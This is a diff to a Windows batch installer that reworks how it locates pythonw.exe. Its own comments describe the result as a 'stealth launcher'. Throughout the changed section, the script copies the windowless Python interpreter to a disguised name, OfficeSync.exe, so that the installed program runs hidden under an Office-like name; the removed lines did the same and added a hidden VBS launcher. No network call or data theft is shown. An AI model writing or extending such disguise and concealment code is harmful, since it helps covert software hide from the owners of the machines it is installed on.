@@ -61,43 +61,69 @@ if %errorLevel% neq 0 (
 echo [4/5] Installing Python dependencies...
 cd /d "%INSTALL_DIR%"
 
-:: FIX BUG #63: Find and copy pythonw.exe with disguised name (CRITICAL for no window)
-set PYTHONW_FOUND=0
-where pythonw.exe >nul 2>&1
-if %errorLevel% equ 0 (
-    for /f "delims=" %%i in ('where pythonw.exe') do (
-        copy "%%i" "%INSTALL_DIR%\OfficeSync.exe" >nul 2>&1
-        if %errorLevel% equ 0 (
-            set PYTHONW_FOUND=1
-            echo     ✓ pythonw.exe copied as OfficeSync.exe
-            goto :found_python
-        )
+:: FIX BUG #63 v2: ROBUST pythonw.exe detection - CRITICAL for no window!
+echo.
+echo [4a/5] Configuring stealth launcher...
+set PYTHONW_PATH=
+set PYTHON_PATH=
+
+:: Method 1: Direct where command
+for /f "delims=" %%i in ('where pythonw.exe 2^>nul') do (
+    set PYTHONW_PATH=%%i
+    goto :pythonw_found
+)
+
+:: Method 2: Find via python.exe location
+for /f "delims=" %%i in ('where python.exe 2^>nul') do (
+    set PYTHON_PATH=%%i
+    set PYTHON_DIR=%%~dpi
+    if exist "!PYTHON_DIR!pythonw.exe" (
+        set PYTHONW_PATH=!PYTHON_DIR!pythonw.exe
+        goto :pythonw_found
     )
 )
 
-:: Fallback: Find pythonw.exe in Python installation directory
-if %PYTHONW_FOUND% equ 0 (
-    for /f "tokens=*" %%i in ('where python.exe 2^>nul') do (
-        set PYTHON_DIR=%%~dpi
-        if exist "!PYTHON_DIR!pythonw.exe" (
-            copy "!PYTHON_DIR!pythonw.exe" "%INSTALL_DIR%\OfficeSync.exe" >nul 2>&1
-            if %errorLevel% equ 0 (
-                set PYTHONW_FOUND=1
-                echo     ✓ pythonw.exe found and copied
-                goto :found_python
-            )
-        )
+:: Method 3: Check common Python installation paths
+for %%p in (
+    "C:\Python312\pythonw.exe"
+    "C:\Python311\pythonw.exe"
+    "C:\Python310\pythonw.exe"
+    "%LOCALAPPDATA%\Programs\Python\Python312\pythonw.exe"
+    "%LOCALAPPDATA%\Programs\Python\Python311\pythonw.exe"
+    "%PROGRAMFILES%\Python312\pythonw.exe"
+    "%PROGRAMFILES%\Python311\pythonw.exe"
+) do (
+    if exist %%p (
+        set PYTHONW_PATH=%%~p
+        goto :pythonw_found
     )
 )
 
-:: Last resort: Create VBS script to launch python without window
-if %PYTHONW_FOUND% equ 0 (
-    echo     ⚠ pythonw.exe not found, creating no-window launcher
-    echo Set WshShell = CreateObject("WScript.Shell") > "%INSTALL_DIR%\OfficeSync.vbs"
-    echo WshShell.Run """%INSTALL_DIR%\python_launcher.bat""", 0, False >> "%INSTALL_DIR%\OfficeSync.vbs"
+:pythonw_found
+if defined PYTHONW_PATH (
+    echo     ✓ Found pythonw.exe: %PYTHONW_PATH%
+    
+    :: Copy to disguised name
+    copy "%PYTHONW_PATH%" "%INSTALL_DIR%\OfficeSync.exe" >nul 2>&1
+    if %errorLevel% equ 0 (
+        echo     ✓ Created OfficeSync.exe (hidden launcher)
+        
+        :: Also keep a backup reference
+        echo %PYTHONW_PATH% > "%INSTALL_DIR%\.pythonw_path"
+    ) else (
+        echo     ⚠ Failed to copy, will use direct path
+        echo %PYTHONW_PATH% > "%INSTALL_DIR%\.pythonw_path"
+    )
+) else (
+    echo     ❌ CRITICAL: pythonw.exe not found!
+    echo     Python 3.12+ must be installed with pythonw.exe
+    echo.
+    echo     Please install Python 3.12 from: https://www.python.org/downloads/
+    echo     Make sure to check "Add Python to PATH" during installation
+    echo.
+    pause
+    exit /b 1
 )
-
-:found_python
 
 echo     Installing dependencies...
 python -m pip install --quiet --upgrade pip
